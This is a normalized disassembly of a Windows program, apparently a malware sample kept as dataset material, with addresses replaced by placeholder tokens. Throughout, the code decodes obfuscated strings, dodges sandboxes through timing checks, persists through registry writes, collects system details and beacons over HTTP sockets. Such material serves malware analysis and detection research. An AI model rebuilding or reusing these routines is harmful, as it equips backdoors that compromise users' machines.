sub_401000
mov eax sub_4046a0
call _EH_prolog
push ecx
push ecx
push ebx
push esi
push edi
xor esi esi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] esi
call sub_401069
call sub_401085
lea eax [ ebp - 0x14 ]
push eax
push esi
push esi
push r-xdata
push esi
push esi
call [ CreateThread@IAT ]
call sub_4011fa
cmp eax esi
jne r-xdata
call sub_401e69
push 0x1
pop eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_401069
push esi
mov esi [ GetTickCount@IAT ]
push edi
call esi
mov edi eax
call esi
call esi
sub eax edi
cmp eax 0xea60
jbe r-xdata
pop edi
pop esi
retn
sub_401085
push esi
push 0x6
push rw-data
call sub_4022fe
push 0x8
pop esi
push esi
push rw-data
call sub_4022fe
push 0x22
push rw-data
call sub_4022fe
push 0x10
push rw-data
call sub_4022fe
push 0x14
push rw-data
call sub_4022fe
push 0x18
push rw-data
call sub_4022fe
push esi
push rw-data
call sub_4022fe
push esi
push rw-data
call sub_4022fe
add esp 0x40
push esi
push rw-data
call sub_4022fe
push 0xa
push rw-data
call sub_4022fe
push 0xd
push rw-data
call sub_4022fe
push esi
push rw-data
call sub_4022fe
push 0xf
push rw-data
call sub_4022fe
push 0xe
push rw-data
call sub_4022fe
push 0xe
push rw-data
call sub_4022fe
push 0x9
push rw-data
call sub_4022fe
add esp 0x40
push 0xf
push rw-data
call sub_4022fe
push 0xd
push rw-data
call sub_4022fe
push 0x11
push rw-data
call sub_4022fe
push 0xa
push rw-data
call sub_4022fe
push 0xc
push rw-data
call sub_4022fe
push rw-data
call strlen
sub eax 0x7
mov esi rw-data
push eax
push esi
call sub_4022fe
push esi
push rw-data
call strcpy
push 0x11
push rw-data
call sub_4022fe
add esp 0x44
push 0xb
push rw-data
call sub_4022fe
push 0x14
push rw-data
call sub_4022fe
push 0xb
push rw-data
call sub_4022fe
push 0x15
push rw-data
call sub_4022fe
push 0xb
push rw-data
call sub_4022fe
add esp 0x28
pop esi
retn
sub_4011fa
push ecx
push ebx
mov ebx [ LoadLibraryA@IAT ]
push ebp
push esi
push edi
push rw-data
call ebx
mov esi [ GetProcAddress@IAT ]
mov edi eax
push rw-data
push edi
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push edi
mov edi [ FreeLibrary@IAT ]
mov [ rw-data ] eax
call edi
push rw-data
call ebx
mov ebp eax
xor ebx ebx
cmp ebp ebx
je r-xdata
xor eax eax
jmp r-xdata
push rw-data
push ebp
call esi
push ebp
mov [ rw-data ] eax
call edi
cmp [ rw-data ] ebx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov esi rw-data
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
add esp 0x40
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
add esp 0x40
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
push esi
mov esi rw-data
push esi
call strcpy
push rw-data
push esi
call strcat
add esp 0x30
push rw-data
mov esi [ CreateEventA@IAT ]
push ebx
push ebx
push ebx
call esi
push rw-data
push ebx
push ebx
push ebx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_40142d
test eax eax
je r-xdata
push rw-data
call sub_40160b
call sub_401649
neg eax
sbb eax eax
neg eax
mov [ rw-data ] eax
call sub_4015a0
call sub_40231b
call sub_401d7e
call sub_401e35
call sub_401e47
mov esi [ malloc@IAT ]
mov edi 0x2000
push edi
call esi
pop ecx
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
push edi
call esi
cmp eax ebx
pop ecx
mov [ rw-data ] eax
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
push ebx
push ebx
push r-xdata
push ebx
push ebx
call [ CreateThread@IAT ]
push 0x1
pop eax
sub_40144c
push ebp
mov ebp esp
sub esp 0x8c
push ebx
push esi
xor ebx ebx
push edi
lea eax [ ebp - 0x4 ]
push ebx
mov edi [ RegCreateKeyExA@IAT ]
push eax
push ebx
push 0x2001f
push ebx
push rw-data
push ebx
push rw-data
push 0x80000002
mov [ ebp - 0xc ] 0x80
mov [ ebp - 0x8 ] ebx
call edi
lea eax [ ebp - 0xc ]
mov esi rw-data
push eax
lea eax [ ebp - 0x8c ]
push eax
push ebx
push ebx
push esi
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push rw-data
push rw-data
call strcpy
pop ecx
pop ecx
mov al [ ebp - 0x8c ]
push [ ebp - 0xc ]
mov [ ebp + eax - 0x8c ] bl
lea eax [ ebp - 0x8c ]
push eax
push 0x1
push ebx
push esi
push [ ebp - 0x4 ]
mov esi [ RegSetValueExA@IAT ]
call esi
lea eax [ ebp - 0x4 ]
push ebx
push eax
push ebx
push 0x2001f
push ebx
push rw-data
push ebx
push rw-data
push 0x80000002
call edi
lea eax [ ebp - 0xc ]
mov edi rw-data
push eax
push rw-data
push ebx
push ebx
push edi
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
inc cl
mov [ ebp + eax - 0x8c ] cl
mov cl [ eax + rw-data ]
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + rw-data ] bl
jmp r-xdata
mov cl al
mov eax [ ebp - 0x8 ]
dec cl
mov [ eax + rw-data ] cl
inc eax
mov [ ebp - 0x8 ] eax
mov al [ ebp + eax - 0x8c ]
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
pop edi
pop esi
pop ebx
je r-xdata
push ebx
call [ time@IAT ]
push eax
call [ srand@IAT ]
pop ecx
pop ecx
call [ rand@IAT ]
push 0x4
push rw-data
push 0x4
push ebx
push edi
mov [ rw-data ] eax
push [ ebp - 0x4 ]
call esi
cmp cl bl
je r-xdata
mov cl [ rw-data ]
xor eax eax
cmp al bl
je r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
sub_4015a0
push esi
push edi
mov esi rw-data
xor edi edi
push esi
push edi
push 0x1f0001
call [ OpenMutexA@IAT ]
cmp eax edi
je r-xdata
push esi
push edi
push edi
call [ CreateMutexA@IAT ]
call sub_40144c
push rw-data
push rw-data
call sub_403924
pop ecx
pop ecx
pop edi
pop esi
retn
push eax
call [ CloseHandle@IAT ]
push [ rw-data ]
call [ SetEvent@IAT ]
push 0x1388
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
push 0x1f4
call [ Sleep@IAT ]
sub_40160b
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi 0x9c
push edi
push 0x0
push esi
call memset
add esp 0xc
mov [ esi ] edi
mov edi [ GetVersionExA@IAT ]
push esi
call edi
test eax eax
jne r-xdata
call [ GetSystemDefaultLangID@IAT ]
pop edi
mov [ rw-data ] ax
pop esi
retn
push esi
mov [ esi ] 0x94
call edi
sub_401649
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
push eax
xor ebx ebx
push 0x1
push ebx
push rw-data
push 0x80000001
mov [ ebp - 0x8 ] 0x4
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x8 ]
mov esi [ RegQueryValueExA@IAT ]
push eax
push rw-data
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x100
call esi
push [ ebp - 0x4 ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp edi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ strstr@IAT ]
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
lea edi [ ebp - 0x108 ]
add edi 0x5
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3a
push edi
call [ strchr@IAT ]
mov esi eax
push edi
push rw-data
mov [ esi ] bl
call strcpy
inc esi
push esi
call [ atoi@IAT ]
add esp 0x14
mov [ rw-data ] eax
push 0x1
pop eax
jmp r-xdata
sub_40172c
push ebp
mov ebp esp
mov eax 0x2124
call sub_4044d0
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_40238e
mov esi [ Ordinal_WSOCK32_10@IAT ]
pop ecx
push eax
call esi
mov ebx eax
mov eax [ ebp + 0xc ]
push 0x0
push 0x1
push 0x2
mov [ ebp - 0xc ] eax
call [ Ordinal_WSOCK32_23@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor eax eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x10 ] 0x1
push eax
push 0x8004667e
push edi
call [ Ordinal_WSOCK32_12@IAT ]
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x8 ] 0x3c
mov [ ebp - 0x120 ] edi
mov [ ebp - 0x124 ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
push rw-data
call esi
mov ebx eax
mov eax [ rw-data ]
jmp r-xdata
push edi
call [ Ordinal_WSOCK32_3@IAT ]
mov eax esi
jmp r-xdata
cmp [ ebp + 0x24 ] 0x1
push [ ebp + 0x18 ]
jne r-xdata
push eax
mov [ ebp - 0x20 ] 0x2
call [ Ordinal_WSOCK32_9@IAT ]
mov [ ebp - 0x1e ] ax
lea eax [ ebp - 0x20 ]
push 0x10
push eax
push edi
mov [ ebp - 0x1c ] ebx
call [ Ordinal_WSOCK32_4@IAT ]
mov ebx [ Ordinal_WSOCK32_18@IAT ]
lea ecx [ ebp - 0x8 ]
push ecx
xor esi esi
lea ecx [ ebp - 0x124 ]
push esi
lea eax [ edi + 0x1 ]
push ecx
push esi
push eax
call ebx
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x24 ]
lea eax [ ebp - 0x2124 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_402021
push 0x1
lea eax [ ebp - 0x2124 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_402122
jmp r-xdata
push edi
call sub_402223
cmp eax 0xffffffff
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
xor esi esi
push eax
lea eax [ ebp - 0x124 ]
push esi
push eax
lea eax [ edi + 0x1 ]
push esi
push eax
call ebx
test eax eax
jle r-xdata
add esp 0x18
lea eax [ ebp - 0x2124 ]
push eax
call strlen
push [ ebp + 0x18 ]
mov esi eax
push [ ebp + 0x14 ]
lea eax [ ebp + esi - 0x2124 ]
push eax
call memcpy
mov eax [ ebp + 0x18 ]
add esp 0x10
add esi eax
lea eax [ ebp - 0x2124 ]
push 0x0
push esi
push eax
push edi
call [ rw-data ]
cmp [ ebp + 0x24 ] 0x1
jne r-xdata
push edi
call [ Ordinal_WSOCK32_3@IAT ]
mov ebx 0x3e800
cmp eax ebx
jge r-xdata
push 0x1
pop esi
jmp r-xdata
xor esi esi
xor esi esi
mov eax ebx
push 0x0
sub eax esi
push eax
mov eax [ ebp + 0x1c ]
add eax esi
push eax
push edi
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0xffffffff
je r-xdata
test eax eax
je r-xdata
push edi
call [ Ordinal_WSOCK32_3@IAT ]
mov eax [ ebp + 0x20 ]
push 0x1
mov [ eax ] esi
pop eax
jmp r-xdata
add esi eax
cmp esi ebx
jl r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea eax [ ebp - 0x124 ]
push 0x0
push eax
lea eax [ edi + 0x1 ]
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
sub_40191d
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ esp + 0x8 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_40172c
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
mov eax [ esi ]
push 0x1
mov [ rw-data ] eax
pop edi
movzx eax [ esi + 0x4 ]
mov [ rw-data ] eax
movzx eax [ esi + 0x6 ]
mov [ rw-data ] eax
pop edi
pop esi
pop ecx
retn
sub_401987
push ebp
mov ebp esp
sub esp 0x58c
push 0x3e800
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
jne r-xdata
push ebx
push esi
mov esi rw-data
push edi
lea eax [ ebp - 0x587 ]
push esi
push eax
call strcpy
push esi
call strlen
mov ebx eax
mov esi rw-data
add ebx 0x6
push esi
lea eax [ ebp + ebx - 0x58c ]
push eax
call strcpy
push esi
call strlen
lea ebx [ ebx + eax + 0x1 ]
mov esi 0x9c
push esi
push rw-data
lea eax [ ebp + ebx - 0x58c ]
push eax
call memcpy
mov ax [ rw-data ]
add ebx esi
mov edx [ rw-data ]
mov esi rw-data
lea edi [ ebp - 0x18c ]
add esp 0x24
movsd [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] ax
inc ebx
movsd [ edi ] [ esi ]
inc ebx
push 0x1d
test edx edx
setne al
movsw [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] al
mov eax [ rw-data ]
inc ebx
pop ecx
movsb [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] eax
xor eax eax
lea edi [ ebp - 0x181 ]
mov esi [ sprintf@IAT ]
[ edi ]
add ebx 0x4
test edx edx
stosb [ edi ]
je r-xdata
leave
retn
lea eax [ ebp - 0x18c ]
push eax
push rw-data
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp + ebx - 0x58c ]
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push eax
call strlen
add esp 0x1c
lea ebx [ ebx + eax + 0x1 ]
call [ GetTickCount@IAT ]
mov ecx 0x36ee80
xor edx edx
mov edi ecx
mov [ ebp - 0x4 ] eax
div edi
mov edi 0xea60
mov eax edx
xor edx edx
div edi
xor edx edx
push eax
mov eax [ ebp - 0x4 ]
div ecx
push eax
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp + ebx - 0x58c ]
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push eax
call strlen
lea esi [ ebx + eax + 0x1 ]
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push 0x2f
push eax
call [ strrchr@IAT ]
mov edi rw-data
lea ebx [ ebp + esi - 0x58c ]
push edi
push ebx
mov [ ebp - 0x4 ] eax
call strcpy
mov eax [ ebp - 0x4 ]
add esp 0x34
test eax eax
je r-xdata
push [ rw-data ]
lea eax [ ebp - 0x18c ]
push rw-data
push rw-data
push eax
call esi
add esp 0x10
lea eax [ ebp - 0xc ]
push 0x1
push eax
lea eax [ ebp - 0x58c ]
push [ ebp - 0x8 ]
mov [ ebp - 0x58c ] 0x30
mov [ ebp - 0x58b ] esi
push esi
push eax
push rw-data
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_40172c
push [ ebp - 0x8 ]
mov esi eax
call [ free@IAT ]
add esp 0x24
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ eax ] 0x0
lea eax [ ebp - 0x10c ]
push eax
push ebx
call strcat
push edi
call strlen
mov edi eax
lea eax [ ebp - 0x10c ]
push eax
call strlen
add esp 0x10
add eax esi
lea esi [ eax + edi + 0x1 ]
sub_401bcd
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_40172c
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
push [ ebp - 0x4 ]
push esi
call sub_401c2a
pop ecx
mov edi eax
pop ecx
pop edi
pop esi
leave
retn
sub_401c2a
push ebx
xor ebx ebx
cmp [ esp + 0xc ] ebx
push esi
push edi
jle r-xdata
xor eax eax
mov edi [ esp + 0x10 ]
mov esi rw-data
push esi
call strlen
pop ecx
add eax ebx
mov eax [ eax + edi + 0x1 ]
xor ecx ecx
cmp eax [ rw-data ]
sete cl
mov eax ecx
jmp r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + edi ]
push esi
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
sub_401c77
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
lea esi [ edi + edi * 4 + 0x3a98 ]
shl esi 0x1
call [ rw-data ]
test edi edi
mov [ rw-data ] eax
jle r-xdata
push 0x1
pop eax
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax edi
push 0x0
sub eax ebx
push eax
mov eax [ esp + 0x18 ]
add eax ebx
push eax
push [ rw-data ]
call [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
retn
add ebx eax
mov eax edi
sub eax ebx
add eax 0xbb8
lea esi [ eax + eax * 4 ]
shl esi 0x1
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
and [ rw-data ] 0x0
push 0x1
call [ Sleep@IAT ]
mov eax esi
dec esi
test eax eax
je r-xdata
jmp r-xdata
cmp ebx edi
jl r-xdata
sub_401d04
push ebp
mov ebp esp
sub esp 0x200
push esi
push 0x200
lea eax [ ebp - 0x200 ]
push 0x0
push eax
call memset
mov esi [ ebp + 0x8 ]
add esp 0xc
push [ esi + 0x1 ]
push 0x1
push rw-data
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_402021
lea eax [ ebp - 0x200 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_401c77
add esp 0x24
test eax eax
je r-xdata
pop esi
leave
retn
push [ ebp + 0xc ]
push esi
call sub_401c77
pop ecx
pop ecx
sub_401d7e
push ecx
push edi
push 0x3e800
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
pop ecx
retn
push ebx
push esi
xor ebx ebx
mov esi rw-data
push esi
push rw-data
call strcpy
pop ecx
pop ecx
inc ebx
cmp ebx 0x3
jl r-xdata
lea eax [ esp + 0xc ]
push 0x0
push eax
push edi
push 0x0
push rw-data
push rw-data
push 0x50
push esi
call sub_40172c
add esp 0x20
test eax eax
jne r-xdata
jmp r-xdata
push edi
call [ free@IAT ]
pop ecx
pop esi
pop ebx
sub_401e02
push rw-data
call sub_4043f5
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
push rw-data
call sub_4041b2
test eax eax
pop ecx
jne r-xdata
push rw-data
push rw-data
call sub_404270
pop ecx
pop ecx
retn
sub_401e69
sub esp 0x10c
lea eax [ esp + 0x8 ]
push ebx
push ebp
push esi
mov esi [ SHGetSpecialFolderPathA@IAT ]
push edi
push 0x0
push 0x26
push eax
push 0x0
call esi
mov edi [ sprintf@IAT ]
push rw-data
lea eax [ esp + 0x1c ]
push rw-data
push eax
mov ebx rw-data
lea eax [ esp + 0x24 ]
push ebx
push eax
call edi
mov ebp [ DeleteFileA@IAT ]
add esp 0x14
lea eax [ esp + 0x18 ]
push eax
call ebp
push 0x0
lea eax [ esp + 0x1c ]
push 0x26
push eax
push 0x0
call esi
push rw-data
lea eax [ esp + 0x1c ]
push rw-data
push eax
lea eax [ esp + 0x24 ]
push ebx
push eax
call edi
add esp 0x14
lea eax [ esp + 0x18 ]
push eax
call ebp
push 0x0
lea eax [ esp + 0x1c ]
push 0x26
push eax
push 0x0
call esi
push rw-data
lea eax [ esp + 0x1c ]
push rw-data
push eax
lea eax [ esp + 0x24 ]
push ebx
push eax
call edi
add esp 0x14
lea eax [ esp + 0x18 ]
push eax
call ebp
push 0x0
lea eax [ esp + 0x1c ]
push 0x26
push eax
push 0x0
call esi
push rw-data
lea eax [ esp + 0x1c ]
push rw-data
push eax
lea eax [ esp + 0x24 ]
push ebx
push eax
call edi
add esp 0x14
lea eax [ esp + 0x18 ]
push eax
call ebp
mov edi [ Sleep@IAT ]
push 0x1
pop esi
mov ebp 0x2710
mov [ rw-data ] esi
push 0x32
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call edi
call sub_401de0
test eax eax
jne r-xdata
push eax
call [ Ordinal_WSOCK32_3@IAT ]
call sub_40191d
test eax eax
jne r-xdata
call sub_401e02
call sub_401987
test eax eax
je r-xdata
push 0x249f0
jmp r-xdata
push ebp
call sub_401bcd
test eax eax
je r-xdata
call edi
jmp r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
je r-xdata
call sub_4023ad
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] esi
push eax
push 0x8004667e
push [ rw-data ]
call [ Ordinal_WSOCK32_12@IAT ]
and [ rw-data ] 0x0
lea eax [ esp + 0x14 ]
push eax
push ebx
push ebx
push sub_4028d3
push ebx
push ebx
mov [ rw-data ] esi
call [ CreateThread@IAT ]
mov [ rw-data ] esi
cmp [ rw-data ] ebx
je r-xdata
call sub_40278e
push esi
call edi
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
sub_402021
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ _itoa@IAT ]
lea eax [ ebp - 0xf ]
push 0xa
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3a
call edi
add esp 0xc
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
push [ ebp + 0x14 ]
push esi
call strcat
cmp [ ebp + 0x18 ] 0x1
pop ecx
pop ecx
jne r-xdata
push rw-data
push esi
call strcat
push [ ebp + 0xc ]
push esi
call strcat
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
add esp 0x18
mov esi [ ebp + 0x8 ]
push esi
call strcpy
cmp [ rw-data ] 0x0
pop ecx
pop ecx
je r-xdata
push rw-data
push esi
call strcat
push rw-data
push esi
call strcat
push [ ebp + 0xc ]
push esi
call strcat
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x28
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
push rw-data
push esi
call strcat
pop ecx
pop ecx
push rw-data
push esi
call strcat
pop ecx
pop ecx
pop edi
pop esi
leave
retn
push rw-data
push esi
call strcat
lea eax [ ebp - 0x10 ]
push 0xa
push eax
push [ ebp + 0x1c ]
call edi
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x24
sub_402122
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ _itoa@IAT ]
lea eax [ ebp - 0xf ]
push 0xa
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3a
call edi
add esp 0xc
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
push [ ebp + 0x14 ]
push esi
call strcat
cmp [ ebp + 0x18 ] 0x1
pop ecx
pop ecx
jne r-xdata
push rw-data
push esi
call strcat
push [ ebp + 0xc ]
push esi
call strcat
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
add esp 0x18
mov esi [ ebp + 0x8 ]
push esi
call strcpy
cmp [ rw-data ] 0x0
pop ecx
pop ecx
je r-xdata
push rw-data
push esi
call strcat
push rw-data
push esi
call strcat
push [ ebp + 0xc ]
push esi
call strcat
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x28
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
push rw-data
push esi
call strcat
pop ecx
pop ecx
push rw-data
push esi
call strcat
pop ecx
pop ecx
pop edi
pop esi
leave
retn
push rw-data
push esi
call strcat
lea eax [ ebp - 0x10 ]
push 0xa
push eax
push [ ebp + 0x1c ]
call edi
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x24
sub_402223
push ebp
mov ebp esp
mov eax 0x2008
call sub_4044d0
push ebx
push esi
xor ebx ebx
push edi
mov edi [ Sleep@IAT ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
lea esi [ ebp - 0x2008 ]
or eax 0xffffffff
cmp eax 0xffffffff
jne r-xdata
mov al [ esi ]
cmp al 0xd
je r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
cmp al 0xa
je r-xdata
push 0x1
call edi
mov eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
cmp eax 0x1388
jg r-xdata
and [ ebp + ebx - 0x2007 ] 0x0
lea eax [ ebp - 0x2008 ]
push rw-data
push eax
call [ strstr@IAT ]
neg eax
sbb eax eax
pop ecx
and eax 0x2
pop ecx
dec eax
jmp r-xdata
inc ebx
inc esi
cmp ebx 0x2000
ja r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
call edi
jmp r-xdata
push 0x0
push 0x1
push esi
push [ ebp + 0x8 ]
call [ Ordinal_WSOCK32_16@IAT ]
test eax eax
je r-xdata
sub_4022d5
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x10 ]
test edx edx
mov [ eax ] edx
jle r-xdata
retn
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push esi
sub eax ecx
mov esi edx
mov dl [ eax + ecx ]
xor dl 0x23
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
pop esi
sub_40231b
push ebp
mov ebp esp
sub esp 0x104
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xff
push eax
push rw-data
call [ rw-data ]
mov eax [ ebp - 0x4 ]
push 0xff
and [ eax + rw-data ] 0x0
lea eax [ ebp - 0x104 ]
push eax
call [ Ordinal_WSOCK32_57@IAT ]
test eax eax
jne r-xdata
push rw-data
lea eax [ ebp - 0x104 ]
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
jmp r-xdata
push rw-data
call strcpy
pop ecx
pop ecx
leave
retn
sub_4023ad
push ebp
mov ebp esp
sub esp 0x124
push ebx
push esi
push edi
xor edi edi
push edi
push 0x1
pop esi
push esi
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ Ordinal_WSOCK32_12@IAT ]
lea ecx [ ebp - 0x4 ]
push ecx
push 0x8004667e
push eax
mov [ ebp - 0x4 ] esi
call ebx
mov eax [ rw-data ]
mov [ ebp - 0xc ] 0x3c
mov [ ebp - 0x120 ] eax
mov ax [ rw-data ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x124 ] esi
mov [ ebp - 0x1c ] 0x2
call [ Ordinal_WSOCK32_9@IAT ]
mov [ ebp - 0x1a ] ax
mov eax [ rw-data ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push 0x10
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_4@IAT ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x124 ]
push edi
push eax
mov eax [ rw-data ]
push edi
inc eax
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jg r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_402b1a
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push edi
push esi
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push edi
push edi
push sub_402943
push edi
push edi
call [ CreateThread@IAT ]
cmp eax edi
mov [ rw-data ] eax
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] edi
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
push 0x8004667e
push eax
call ebx
mov eax [ rw-data ]
mov [ ebp - 0xc ] 0x3c
mov [ ebp - 0x120 ] eax
mov ax [ rw-data ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x124 ] esi
mov [ ebp - 0x1c ] 0x2
